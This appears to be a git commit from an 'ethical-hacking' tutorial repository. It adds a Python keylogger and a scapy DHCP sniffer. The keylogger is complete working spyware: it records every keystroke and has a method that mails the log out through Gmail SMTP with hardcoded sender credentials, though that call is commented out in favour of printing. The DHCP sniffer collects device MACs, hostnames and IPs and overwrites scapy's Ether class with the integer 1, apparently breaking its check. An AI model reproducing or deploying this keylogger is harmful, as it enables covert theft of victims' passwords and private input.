885651f74594e0403750e6be8d7fe00ad855181e
x4nth055 <fullclip@protonmail.com>
2019-08-04 19:50:39 +0200

    added keylogger

---
+++ ethical-hacking/keylogger/keylogger.py
@@ -0,0 +1,84 @@
+import keyboard # for keylogs
+import smtplib # for sending email using SMTP protocol (gmail)
+# Semaphore is for blocking the current thread
+# Timer is to make a method runs after an `interval` amount of time
+from threading import Semaphore, Timer
+
+SEND_REPORT_EVERY = 600 # 10 minutes
+EMAIL_ADDRESS = "thepythoncode.sender@gmail.com"
+EMAIL_PASSWORD = "thepythoncodeokok123"
+
+class Keylogger:
+    def __init__(self, interval):
+        # we gonna pass SEND_REPORT_EVERY to interval
+        self.interval = interval
+        # this is the string variable that contains the log of all 
+        # the keystrokes within `self.interval`
+        self.log = ""
+        # for blocking after setting the on_release listener
+        self.semaphore = Semaphore(0)
+
+    def callback(self, event):
+        """
+        This callback is invoked whenever a keyboard event is occured
+        (i.e when a key is released in this example)
+        """
+        name = event.name
+        if len(name) > 1:
+            # not a character, special key (e.g ctrl, alt, etc.)
+            # uppercase with []
+            if name == "space":
+                # " " instead of "space"
+                name = " "
+            elif name == "enter":
+                # add a new line whenever an ENTER is pressed
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                # replace spaces with underscores
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+
+        self.log += name
+    
+    def sendmail(self, email, password, message):
+        # manages a connection to an SMTP server
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        # connect to the SMTP server as TLS mode ( for security )
+        server.starttls()
+        # login to the email account
+        server.login(email, password)
+        # send the actual message
+        server.sendmail(email, email, message)
+        # terminates the session
+        server.quit()
+
+    def report(self):
+        """
+        This function gets called every `self.interval`
+        It basically sends keylogs and resets `self.log` variable
+        """
+        if self.log:
+            # if there is something in log, report it
+            # self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            print(self.log)
+        self.log = ""
+        Timer(interval=self.interval, function=self.report).start()
+
+    def start(self):
+        # start the keylogger
+        keyboard.on_release(callback=self.callback)
+        # start reporting the keylogs
+        self.report()
+        # block the current thread,
+        # since on_release() doesn't block the current thread
+        # if we don't block it, when we execute the program, nothing will happen
+        # that is because on_release() will start the listener in a separate thread
+        self.semaphore.acquire()
+
+    
+
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
+    keylogger.start()
---
+++ scapy/dhcp_listener/dhcp_listener.py
@@ -0,0 +1,53 @@
+from scapy.all import *
+from scapy.layers.dhcp import DHCP
+import time
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+
+hosts = []
+Ether = 1
+
+
+def listen_dhcp():
+    global k
+    # Make sure it is DHCP with the filter options
+    k = sniff(prn=print_packet, filter='udp and (port 67 or port 68)')
+
+def print_packet(packet):
+    target_mac, requested_ip, hostname, vendor_id = [None] * 4
+    if packet.haslayer(Ether):
+        target_mac = packet.getlayer(Ether).src
+    dhcp_options = packet[DHCP].options
+    for item in dhcp_options:
+        try:
+            label, value = item
+        except ValueError:
+            continue
+        if label == 'requested_addr':
+            requested_ip = value
+        elif label == 'hostname':
+            hostname = value.decode()
+        elif label == 'vendor_class_id':
+            vendor_id = value.decode()
+        if target_mac and vendor_id and hostname and requested_ip and target_mac not in hosts:
+            hosts.append(target_mac)
+            time_now = time.strftime("[%Y-%m-%d - %H:%M:%S] ")
+            print("{}: {}  -  {} / {} requested {}".format(time_now, target_mac, hostname, vendor_id, requested_ip))
+
+
+if __name__ == "__main__":
+    listen_dhcp()
+
